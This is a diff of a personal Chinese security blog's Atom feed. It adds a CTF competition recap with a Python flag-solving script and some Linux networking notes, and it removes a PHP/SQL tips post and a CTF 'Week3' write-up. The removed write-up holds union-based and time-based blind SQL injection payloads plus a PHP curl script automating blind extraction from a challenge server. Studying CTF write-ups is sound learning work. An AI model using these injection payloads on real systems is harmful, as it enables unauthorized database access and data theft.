@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://lazysheep.cc/"/>
-  <updated>2015-05-20T08:16:33.000Z</updated>
+  <updated>2015-06-05T13:27:45.000Z</updated>
   <id>http://lazysheep.cc/</id>
   
   <author>
@@ -13,6 +13,50 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[墙网杯总结]]></title>
+    <link href="http://lazysheep.cc/2015/06/05/0x27/"/>
+    <id>http://lazysheep.cc/2015/06/05/0x27/</id>
+    <published>2015-06-05T13:11:53.000Z</published>
+    <updated>2015-06-05T13:27:45.000Z</updated>
+    <content type="html"><![CDATA[<p><strong>对于上周末的墙网杯总结</strong><br>这次比赛略赛，，全是取证，密码这种题，，，web题就三题，算上js逆向，勉强4题，两题抄的，一个500分，还那么迟放，日不动。。<br><a id="more"></a><br>这次撸出来了四题，第一题密码题，有点烦，懒得写writeup了。。。</p>
+<p>web100，是php代码审计吧，.bak下载源码，然后审计，抄袭php4fun的，秒拿一二血。</p>
+<p>web200，是改CodeGate 2015 猫头鹰那题，思路基本一致，参考writeup：<a href="https://github.com/pwning/public-writeup/blob/master/codegate2015/web200-owlur/writeup.md" target="_blank" rel="external">https://github.com/pwning/public-writeup/blob/master/codegate2015/web200-owlur/writeup.md</a></p>
+<p>逆向100，这题是js逆向，写了一个python脚本跑，贴出脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">ss = <span class="string">"a[11]-a[5]%a[1]*a[12]%a[14]-a[6]*a[7]-a[24]+a[10]%a[13]+a[2]*a[23]+a[21]+a[15]%a[3]%a[19]-a[20]*a[0]%a[17]+a[18]-a[22]+a[8]+a[4]-a[9]+a[25]+a[16]==-161&amp;&amp;a[14]+a[19]%a[20]-a[3]-a[4]+a[5]%a[23]%a[12]%a[21]-a[18]%a[24]%a[0]+a[6]*a[17]-a[7]*a[9]-a[10]+a[8]+a[22]*a[15]%a[16]-a[26]-a[1]%a[11]+a[2]+a[25]+a[13]==-42&amp;&amp;a[34]+a[27]+a[29]-a[10]*a[13]*a[20]%a[31]+a[2]*a[23]-a[0]*a[8]-a[6]*a[9]-a[19]%a[3]+a[15]%a[1]-a[25]-a[26]*a[16]%a[30]-a[17]+a[12]+a[5]-a[33]+a[21]+a[24]*a[14]+a[11]*a[32]-a[22]*a[4]+a[18]+a[28]-a[7]==-56&amp;&amp;a[20]+a[13]%a[4]-a[21]+a[16]-a[12]+a[11]%a[9]%a[3]%a[0]*a[8]%a[2]+a[5]%a[17]+a[15]-a[10]%a[18]-a[6]-a[1]-a[19]*a[7]%a[14]==-76&amp;&amp;a[6]%a[29]+a[4]+a[18]%a[22]+a[16]+a[30]-a[19]*a[21]+a[24]+a[5]-a[34]*a[13]+a[17]*a[11]-a[31]*a[23]+a[14]+a[28]+a[20]-a[10]+a[32]+a[33]%a[12]*a[26]+a[2]%a[15]*a[1]+a[27]*a[25]-a[3]%a[7]%a[8]*a[9]-a[0]+a[35]==-129&amp;&amp;a[1]*a[3]*a[5]%a[6]-a[2]%a[0]+a[4]-a[7]==18&amp;&amp;a[19]+a[20]+a[4]+a[0]-a[17]-a[8]-a[2]*a[7]+a[18]-a[14]-a[3]-a[5]+a[10]-a[11]+a[6]*a[1]%a[13]%a[15]*a[12]-a[9]-a[16]==-36&amp;&amp;a[6]-a[1]+a[4]+a[0]%a[5]%a[2]-a[3]==21&amp;&amp;a[1]-a[5]%a[4]%a[8]%a[3]-a[10]-a[0]%a[7]%a[9]%a[6]-a[2]==-157&amp;&amp;a[9]%a[5]-a[11]+a[7]-a[0]%a[10]*a[4]%a[3]+a[1]-a[6]%a[8]+a[2]==99&amp;&amp;a[1]+a[4]%a[0]%a[3]*a[7]%a[6]-a[8]-a[2]+a[5]==127&amp;&amp;a[8]+a[34]%a[10]%a[4]%a[16]+a[25]+a[15]-a[31]-a[2]*a[3]-a[27]*a[13]%a[23]%a[1]+a[17]*a[26]+a[5]%a[30]+a[35]%a[36]+a[22]%a[7]%a[29]-a[21]+a[28]*a[18]-a[37]+a[38]+a[11]%a[20]+a[9]-a[32]-a[0]*a[14]+a[33]*a[12]+a[24]-a[19]+a[6]==4&amp;&amp;a[2]-a[1]-a[3]+a[0]==-12&amp;&amp;a[6]%a[25]%a[17]+a[24]-a[23]+a[15]%a[31]*a[13]+a[29]-a[12]%a[0]*a[11]-a[27]+a[5]-a[2]-a[10]%a[28]*a[14]-a[8]+a[7]*a[22]+a[26]+a[3]%a[21]+a[32]-a[20]*a[4]+a[30]+a[18]*a[16]-a[9]%a[1]%a[19]==132&amp;&amp;a[17]-a[11]+a[1]-a[0]%a[5]*a[12]%a[13]+a[4]%a[14]-a[10]-a[15]%a[8]%a[7]+a[6]-a[2]%a[16]+a[9]+a[3]==128&amp;&amp;a[28]+a[19]*a[9]+a[26]%a[5]-a[22]+a[3]%a[4]+a[12]%a[0]+a[25]%a[2]%a[13]-a[15]+a[23]%a[21]*a[27]%a[20]%a[16]%a[11]+a[24]%a[7]-a[6]*a[1]-a[14]+a[18]+a[10]%a[8]-a[17]==-43&amp;&amp;a[11]*a[2]%a[19]*a[6]-a[14]+a[32]*a[1]%a[28]-a[3]%a[27]-a[4]+a[13]+a[24]%a[12]-a[10]+a[23]-a[15]%a[0]%a[31]%a[16]-a[17]*a[7]%a[21]%a[20]%a[25]*a[8]+a[22]*a[18]%a[5]-a[26]+a[33]+a[9]%a[30]%a[29]==87&amp;&amp;a[11]*a[17]%a[16]-a[18]%a[13]+a[10]+a[0]%a[5]-a[23]+a[15]*a[21]%a[20]+a[9]+a[7]-a[19]*a[2]-a[24]+a[1]*a[14]+a[6]%a[4]%a[8]%a[3]-a[22]-a[12]==-130&amp;&amp;a[1]-a[3]-a[6]*a[9]%a[13]-a[18]+a[2]*a[12]*a[7]%a[0]-a[16]+a[17]-a[4]*a[5]%a[14]+a[10]*a[11]*a[15]%a[8]==-123&amp;&amp;a[14]-a[26]-a[21]+a[34]%a[15]+a[9]+a[19]%a[13]+a[36]+a[18]%a[11]*a[12]%a[30]+a[29]+a[31]%a[17]-a[5]*a[24]*a[20]%a[8]%a[22]-a[4]-a[25]%a[10]-a[6]-a[3]-a[0]*a[23]%a[35]+a[28]%a[16]%a[32]%a[2]+a[33]-a[1]*a[27]%a[7]==-75&amp;&amp;a[31]%a[38]+a[23]%a[33]-a[10]*a[3]+a[5]+a[35]-a[20]%a[27]*a[13]+a[30]%a[14]*a[1]%a[6]+a[37]%a[4]-a[26]*a[21]-a[7]-a[36]-a[16]*a[0]+a[28]*a[34]*a[42]*a[41]%a[9]-a[15]+a[19]*a[24]+a[11]*a[17]+a[39]%a[32]+a[43]+a[18]*a[2]-a[12]-a[25]-a[29]-a[22]+a[8]*a[40]==123&amp;&amp;a[4]*a[3]%a[2]%a[0]-a[5]+a[1]==48&amp;&amp;a[25]-a[30]+a[16]-a[37]-a[21]*a[36]*a[4]%a[11]+a[32]-a[29]%a[34]-a[2]+a[20]%a[1]+a[10]-a[33]+a[0]%a[19]-a[22]+a[8]+a[13]%a[31]+a[17]%a[24]%a[7]+a[26]-a[3]%a[14]%a[12]*a[5]%a[18]-a[23]*a[6]%a[28]+a[15]-a[35]+a[27]%a[9]==21&amp;&amp;a[2]-a[4]+a[3]%a[0]+a[1]==83&amp;&amp;a[7]*a[21]*a[12]%a[3]-a[17]-a[38]+a[23]+a[6]%a[28]%a[27]%a[14]%a[39]+a[13]+a[32]+a[40]-a[4]-a[8]%a[11]%a[25]*a[31]+a[20]*a[24]%a[29]%a[34]*a[30]%a[33]%a[5]-a[26]*a[18]%a[2]+a[10]+a[36]*a[9]%a[37]*a[19]-a[15]*a[1]%a[35]%a[22]%a[16]-a[0]==75&amp;&amp;a[27]*a[29]*a[11]%a[8]-a[24]*a[16]+a[10]%a[2]%a[7]*a[6]+a[23]+a[0]+a[4]*a[22]-a[30]+a[12]-a[17]%a[5]%a[1]*a[15]-a[19]*a[20]-a[3]-a[9]-a[13]+a[25]*a[18]%a[14]+a[26]%a[28]*a[21]==19&amp;&amp;a[45]-a[9]%a[42]-a[0]+a[44]%a[20]*a[13]-a[38]%a[36]*a[17]+a[24]+a[31]+a[28]-a[7]%a[16]*a[39]*a[25]*a[1]%a[14]*a[41]-a[18]-a[4]-a[3]%a[10]+a[23]%a[12]+a[37]*a[29]%a[2]+a[30]-a[22]+a[32]%a[34]+a[33]+a[8]%a[26]*a[11]*a[15]%a[40]%a[5]%a[19]-a[21]+a[43]%a[6]*a[35]+a[27]==-76&amp;&amp;a[7]+a[9]+a[1]-a[11]*a[5]*a[3]%a[12]-a[13]-a[4]-a[6]+a[8]%a[2]%a[0]%a[10]==-84&amp;&amp;a[0]-a[1]==-6&amp;&amp;a[2]-a[6]%a[8]+a[7]-a[4]-a[1]%a[3]+a[9]-a[5]+a[0]==50&amp;&amp;a[44]-a[24]+a[25]%a[30]%a[41]*a[3]-a[23]+a[20]*a[38]+a[15]-a[43]+a[8]-a[29]*a[9]+a[27]+a[33]-a[39]*a[18]%a[0]+a[7]-a[6]-a[42]-a[2]+a[31]+a[4]-a[32]*a[40]-a[22]+a[13]+a[34]%a[17]*a[14]%a[37]+a[36]-a[10]*a[5]%a[11]*a[19]+a[12]+a[16]%a[35]*a[21]+a[28]-a[26]-a[1]==-44&amp;&amp;a[9]%a[3]%a[7]%a[0]%a[4]-a[2]-a[11]-a[12]+a[6]-a[5]%a[10]+a[8]-a[1]==-187&amp;&amp;a[8]%a[7]+a[6]-a[14]-a[4]%a[17]+a[11]-a[12]%a[5]%a[2]+a[15]-a[9]%a[10]*a[13]%a[0]-a[18]+a[19]+a[16]-a[3]-a[1]==-7&amp;&amp;a[12]%a[3]+a[15]-a[0]-a[11]+a[13]+a[4]*a[2]%a[1]-a[10]-a[5]+a[9]+a[6]%a[7]*a[8]%a[14]==-22&amp;&amp;a[4]+a[16]+a[10]+a[5]-a[7]-a[11]-a[9]%a[13]-a[1]-a[12]%a[2]*a[14]%a[8]%a[6]+a[3]-a[15]%a[0]==97&amp;&amp;a[0]*a[1]%a[11]*a[14]%a[10]+a[5]+a[7]%a[13]-a[4]%a[19]-a[15]-a[8]%a[18]%a[21]%a[12]%a[17]-a[3]%a[9]-a[6]+a[20]+a[16]+a[22]-a[2]==112&amp;&amp;a[0]==102&amp;&amp;a[2]+a[0]-a[1]==91&amp;&amp;a[5]*a[4]%a[12]+a[18]+a[27]+a[22]+a[21]-a[10]-a[25]-a[20]%a[7]+a[14]%a[17]%a[23]+a[19]*a[13]%a[26]-a[1]*a[3]%a[8]+a[24]-a[6]+a[16]+a[0]-a[9]-a[15]%a[2]-a[11]==163&amp;&amp;a[8]*a[10]*a[4]*a[21]%a[26]*a[6]%a[14]+a[22]*a[5]+a[18]-a[25]-a[7]-a[11]+a[23]-a[9]*a[15]-a[2]+a[28]%a[17]*a[1]%a[0]-a[3]%a[16]-a[12]*a[20]+a[29]+a[27]%a[24]%a[19]-a[13]==-46&amp;&amp;a[21]-a[36]-a[16]+a[28]-a[3]%a[1]+a[35]-a[8]-a[30]+a[29]%a[19]+a[39]-a[2]+a[24]*a[11]%a[34]%a[15]%a[38]%a[12]-a[33]+a[20]%a[14]-a[18]-a[31]+a[5]%a[10]+a[7]+a[4]%a[26]*a[23]+a[27]-a[6]*a[37]%a[17]*a[25]%a[9]%a[22]-a[0]*a[13]%a[32]==184&amp;&amp;a[38]*a[34]%a[30]-a[31]+a[26]-a[27]-a[16]%a[0]-a[18]%a[24]%a[29]%a[12]+a[20]-a[15]*a[7]+a[17]-a[13]-a[36]-a[25]%a[8]*a[22]+a[6]-a[35]%a[39]+a[9]%a[3]%a[10]%a[19]*a[37]+a[40]%a[28]+a[41]-a[2]*a[23]*a[4]%a[1]-a[32]%a[14]%a[11]*a[21]%a[5]+a[33]==167&amp;&amp;a[13]-a[6]%a[5]-a[0]%a[9]+a[21]+a[23]+a[18]%a[17]%a[16]%a[7]-a[20]%a[1]*a[15]%a[19]%a[8]*a[2]%a[22]-a[14]%a[11]%a[10]*a[4]%a[3]+a[12]==155&amp;&amp;a[23]+a[26]%a[17]%a[20]*a[39]-a[7]-a[0]-a[27]*a[15]+a[25]%a[18]%a[16]%a[42]%a[32]+a[6]*a[14]-a[2]-a[36]+a[35]+a[29]+a[34]-a[31]-a[5]+a[41]%a[3]*a[13]*a[10]%a[12]-a[21]*a[38]%a[24]-a[46]+a[33]%a[4]%a[11]*a[40]%a[44]+a[28]-a[22]%a[30]+a[8]-a[19]-a[1]*a[43]*a[37]%a[45]+a[9]==183&amp;&amp;a[22]%a[18]+a[12]*a[23]-a[41]*a[17]+a[15]-a[5]%a[25]-a[14]%a[16]-a[3]+a[36]+a[1]-a[42]+a[26]%a[39]%a[10]+a[28]%a[27]-a[7]-a[30]-a[19]%a[2]+a[32]%a[0]-a[6]+a[11]-a[13]%a[35]*a[29]-a[4]*a[24]*a[37]%a[40]+a[31]%a[33]*a[38]-a[21]+a[8]*a[34]%a[20]*a[9]==39&amp;&amp;a[6]%a[0]*a[9]%a[2]%a[4]%a[10]-a[14]+a[13]%a[11]-a[8]%a[5]+a[7]+a[12]+a[1]-a[3]==163&amp;&amp;a[13]-a[15]+a[23]*a[17]*a[27]%a[8]-a[14]%a[22]-a[29]*a[5]%a[25]+a[4]%a[10]-a[19]%a[7]%a[12]%a[11]+a[20]+a[31]+a[18]+a[21]*a[30]%a[1]%a[28]+a[0]%a[26]+a[6]%a[24]%a[3]-a[2]-a[16]-a[9]==147"</span></span><br><span class="line">sss = ss.split(<span class="string">'&amp;&amp;'</span>)</span><br><span class="line"></span><br><span class="line">u = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; len(sss):</span><br><span class="line">	o = sss[i]</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(i,len(sss)):</span><br><span class="line">		<span class="keyword">if</span> len(sss[j]) &lt; len(o):</span><br><span class="line">			o = sss[j]</span><br><span class="line">	sss.remove(o)</span><br><span class="line">	u.append(o)</span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> u:</span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">		a = cc[:]</span><br><span class="line">		a.append(j)</span><br><span class="line">		<span class="keyword">if</span> eval(i):</span><br><span class="line">			cc.append(j)</span><br><span class="line">			<span class="keyword">break</span>	</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line"><span class="keyword">print</span> cc</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cc:</span><br><span class="line">	flag += chr(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
+<p>至于密码学的题目，，简直醉了，，看了writeup也不懂，，，哎</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><strong>对于上周末的墙网杯总结</strong><br>这次比赛略赛，，全是取证，密码这种题，，，web题就三题，算上js逆向，勉强4题，两题抄的，一个500分，还那么迟放，日不动。。<br>]]>
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Linux笔记]]></title>
+    <link href="http://lazysheep.cc/2015/05/24/0x26/"/>
+    <id>http://lazysheep.cc/2015/05/24/0x26/</id>
+    <published>2015-05-24T05:20:10.000Z</published>
+    <updated>2015-05-24T06:19:29.000Z</updated>
+    <content type="html"><![CDATA[<p><strong>最近在看鸟哥的私房菜，服务器架设篇，做些笔记。</strong><br><a id="more"></a></p>
+<p>1.发现一个好玩的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vim</span> /etc/hosts</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>        localhost     //这就是为什么localhost等同于<span class="number">127.0</span>.<span class="number">0.1</span>的原因</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.1</span>    hahaha　　//所以我突发奇想加了一个这个，ping hahaha　就相当于ping <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line">//这是因为在linux系统上，用户请求连接一个非ip地址，系统第一会先来这个文件查找，没找到再请求DNS</span><br><span class="line"></span><br><span class="line">//不过有些问题，如果是中文，浏览器访问不了。</span><br></pre></td></tr></table></figure></p>
+<p>2.<code>ping -s xxx ip</code>  //-s用来指定发送的数据包的大小，可以用来检测网络的最大MTU.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line"><span class="variable">$ping</span> -c <span class="number">2</span> <span class="operator">-s</span> <span class="number">1000</span> -M <span class="keyword">do</span> <span class="number">192.168</span>.<span class="number">1.254</span></span><br></pre></td></tr></table></figure></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><strong>最近在看鸟哥的私房菜，服务器架设篇，做些笔记。</strong><br>]]>
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://lazysheep.cc/tags/Linux/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[渗透题writeup]]></title>
@@ -613,104 +657,6 @@
       <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
     
       <category term="代码审计" scheme="http://lazysheep.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[每日函数]]></title>
-    <link href="http://lazysheep.cc/2015/02/08/0x12/"/>
-    <id>http://lazysheep.cc/2015/02/08/0x12/</id>
-    <published>2015-02-08T07:18:22.000Z</published>
-    <updated>2015-02-25T07:13:44.000Z</updated>
-    <content type="html"><![CDATA[<p><strong>今天心血来潮，，打算从今天开始不定时的在这篇博文中记录几个PHP或SQL好用的函数～_～，这样做一来可以慢慢建立一个我可以快速查询的字典，二来可以让我坚持学习= =</strong><br><a id="more"></a></p>
-<blockquote>
-<ul>
-<li>PHP : array_merge(arr1 ,arr2, …)  // 合并数组，参数为数组，返回参数中数组合并的结果</li>
-<li>SQL : sleep(int x) //数据库休息 x 秒</li>
-</ul>
-</blockquote>
-<p>============write time : 8/2 2015===============</p>
-<blockquote>
-<ul>
-<li>SQL : mysqldump -u [用户名] -p [密码] [数据库名] &gt; [导出的文件名] //进行本地数据库导出到本地</li>
-<li>SQL : source [导入文件名] //在use数据库之后,可以进行导入..<br>*SQL :  mysqldump -h [主机名] -u [用户名] -p [密码] [数据库名] &gt; [导出的文件名] //把远程数据库导出到本地</li>
-</ul>
-</blockquote>
-<p>==============write time : 13/2 2015 ===============</p>
-<blockquote>
-<ul>
-<li>SQL : group_concat()<br>  eg : 在test数据库下有个user表,表中有个id字段,则 <code>select group_concat(id) from user;</code> 查询出该表下所有id的值…</li>
-<li>PHP : substr(x,y,z) //此函数的功能为截取字符串, —&gt; 从x字符串中第y+1位(这是因为第一位为0)开始截取z个字符,最后返回截取的字符…….</li>
-</ul>
-</blockquote>
-<p>============write time : 15/2 2015 ===================</p>
-<blockquote>
-<ul>
-<li>PHP : file_put_contents($a,$b) //$a -&gt; 写入哪个文件   $b -&gt; 写入的内容<br>//最近遇到一种情况,修改已经发布的项目.这时候就不能用 <code>var_dump()</code> 输出变量.我自己就想了一个笨方法,,把变量输出到文件中,用到了上面这个函数.<br>不过,数组变量却无法输出到文件,,,这时候又发现一个函数 : <code>var_export($array, true)</code><br>最后变成这样 :  <code>file_put_contents(&#39;test.txt&#39;,var_export($array, true), FILE_APPEND);</code><br>//后面发现var_export()和var_dump()是一个类型的函数…不过我觉得dump更好用..<br>最后一个参数 : FILE_APPEND 表示可以在文件最后追加内容.</li>
-<li>SQL : show table status;  //获取当前数据库所有表的详细信息<br>//如果只想获取其中具体表的信息可以用 <code>like &#39;表名&#39;</code> 或 <code>where Name=&#39;表名&#39;</code><br>eg : show table status like ‘表名’;       OR     show table status where Name=’表名’;</li>
-</ul>
-</blockquote>
-<p>===================write time : 25/2 2015================</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><strong>今天心血来潮，，打算从今天开始不定时的在这篇博文中记录几个PHP或SQL好用的函数～_～，这样做一来可以慢慢建立一个我可以快速查询的字典，二来可以让我坚持学习= =</strong><br>]]>
-    
-    </summary>
-    
-      <category term="PHP" scheme="http://lazysheep.cc/tags/PHP/"/>
-    
-      <category term="SQL" scheme="http://lazysheep.cc/tags/SQL/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[Week3]]></title>
-    <link href="http://lazysheep.cc/2015/02/07/0x11/"/>
-    <id>http://lazysheep.cc/2015/02/07/0x11/</id>
-    <published>2015-02-07T14:48:23.000Z</published>
-    <updated>2015-04-18T13:34:12.000Z</updated>
-    <content type="html"><![CDATA[<p><strong>题做多了果然有经验了，5小时AK了这周的四题</strong><br>拿了两题的一血～～～</p>
-<a id="more"></a>
-<p>=================================================write time : 7/2 23:00</p>
-<h2 id="0x6_做不出来不要玩CTF系列之二(Rank:50)">0x6 做不出来不要玩CTF系列之二(Rank:50)</h2><p>//这题算是简单的题目了。。不难，也没什么脑洞之类的。。</p>
-<p>这题的flag分为三部分，我最先搞出来的是flag3。。点击<br><a href="http://104.236.171.163/week3/web50/gogogo.php" target="_blank" rel="external">点我寻址flag</a><br>后查看源码，，看到那一串东西，很眼熟，在 <a href="http://drops.hduisa.cn/page/9/" target="_blank" rel="external">drops</a>里看到过，记得是 <code>XSS的Game&amp;&amp;Write-up</code> 中的第一个 <a href="http://escape.alf.nu/" target="_blank" rel="external">Escape</a> XSS练习中的一题出现过，，截取这串东西的前面一部分，百度，第一个页面。。。</p>
-<p>Get Flag3～</p>
-<p>然后就是flag1，回到开始的界面，F12 —&gt; 网络 —&gt; 响应头信息</p>
-<p>Get Flag1～</p>
-<p>接下来就差flag2了，，点击<br><a href="http://104.236.171.163/week3/web50/gogogo.php" target="_blank" rel="external">点我寻址flag</a><br>跳转的时候按 <code>ESC</code> 然后查看页面源码。<br>PS：如果实在手速慢，可以用wireshark抓包，或者burp也行。。。</p>
-<p>Get Flag2～</p>
-<p>然后三个flag组合起来得到最终 Flag ～～</p>
-<h2 id="0x7_SQLi系列之一(Rank:200)">0x7 SQLi系列之一(Rank:200)</h2><p>//这周的难题之一，我能这么快做出来是因为这题目和上次提到的 <a href="#">安全科普：SQLi Labs 指南</a>里的好像。。。</p>
-<p>根据提示，这题是手注，过滤了 <code>or</code> 和 <code>and</code> 然后打开题目，得到两个信息，是在 <code>id</code> 后面进行注入和 Flag 应该就在当前数据库的 flag表中，然后开始尝试注入。。。。。</p>
-<p>然后发现用双引号会报错 ，猜测源码是<br><code>select * from xx where id=&quot;$id&quot;</code></p>
-<p>接着根据在 <a href="#">安全科普：SQLi Labs 指南</a>中学到的，试着用 <code>union</code> 注入，发现 payload：<code>?id=0&quot; union select 1,2,3 --+</code>成功。。。</p>
-<p>然后猜测Flag在flag表中的字段名为flag，于是构造payload：<code>?id=0&quot; union select 1,flag,3 from flag --+</code> </p>
-<p>Get Flag～</p>
-<h1 id="0x8_SQLi系列之二(Rank:200)">0x8 SQLi系列之二(Rank:200)</h1><p>//界面和上一题一样，，不过我觉得比上一题难，可是Rank分还是200.。。。。。</p>
-<p>PS：这题也许有简单的方法，，不过我没发现，，用的是笨方法，上一周的基于时间的盲注。。</p>
-<p>跟上题差不多的思路，先用上一题的payload测试一下，发现报错，<code>select 1</code>、<code>select 1,2</code>、<code>select 1,2,3,4</code> 等等都试了没用，，猜测是<code>union</code>过滤了，接着又试了 <code>?id=0&quot; or 1--+</code> 和 <code>?id=0&quot; and 1 --+</code>，成功，说明 <code>or</code> 和 <code>and</code> 都没过滤，然后试 <code>ord()</code> 、<code>mid()</code>都没用，然后想起上次看到的两个函数 <code>ascii()</code> 和 <code>substr()</code> 结果发现行，然后就用 <code>ascii()</code>替代 <code>ord()</code>、<code>substr()</code>替代 <code>mid()</code> 构造payload：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and (<span class="operator"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">96</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">3</span>))) <span class="comment">--+</span></span><br><span class="line"><span class="string">``</span><span class="string">` </span><br><span class="line">得出当前数据库flag表flag字段名下的数据第一个字符为 ‘h’，然后就知道方向没错了，又注出来接下来的是 ‘hctf&#123;’，然后就开始写脚本注入后面的数据了。。。</span><br><span class="line"></span><br><span class="line">下面为我用php写的脚本，跟上一周那题的没差～</span></span></span><br></pre></td></tr></table></figure></p>
-<p>&lt;?php<br>for($i=96;$i<123;$i++){ $login_url="http://104.236.171.163/week3/blindsqli2/?id=1" and (select if(ascii(substr((select flag from flag),1,1)) > " .$i.',1,sleep(3)))="" --+';="" $ch="curl_init($login_url);" curl_setopt($ch,="" curlopt_returntransfer,1);="" $stime="microtime(true);" $arr="curl_exec($ch);" $etime="microtime(true);" curl_close($ch);="" $total="$etime-$stime;" echo="">";
-        if($total>3){<br>            echo chr($i);<br>            $i = 58;<br>        }<br>}<br>?&gt;<br>```<br>用脚本盲注的思路和上一周的基本一致。。然后。</123;$i++){></p>
-<p>Get Flag～</p>
-<p>PS：看着我写的这么迟钝的脚本，，激起了我好好学py的决心～～</p>
-<h2 id="0x9_做不出来不要玩CTF系列之三(Rank:20)">0x9 做不出来不要玩CTF系列之三(Rank:20)</h2><p>//这周题目多了一题，有四题，真棒～～</p>
-<p>这题是我觉得这周最坑的题，，，，（/捂脸。。好吧，我承认是我自己想太多了）。。。我竟然往注入方向想了。。浪费了我那么长时间。。</p>
-<p>这么没技术。。也没难度。。。就是让你试着 <code>id=1</code> 、<code>id=2</code>这样一个一个试下去。。。就出来了。。。</p>
-<p>Get Flag！</p>
-<p>======================================PS:写在最后<br><strong>果然题目做多了。思路就开阔了。。。坚持学下去。。就一定会有收获～～</strong></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><strong>题做多了果然有经验了，5小时AK了这周的四题</strong><br>拿了两题的一血～～～</p>]]>
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
-    
-      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
     
       <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
     
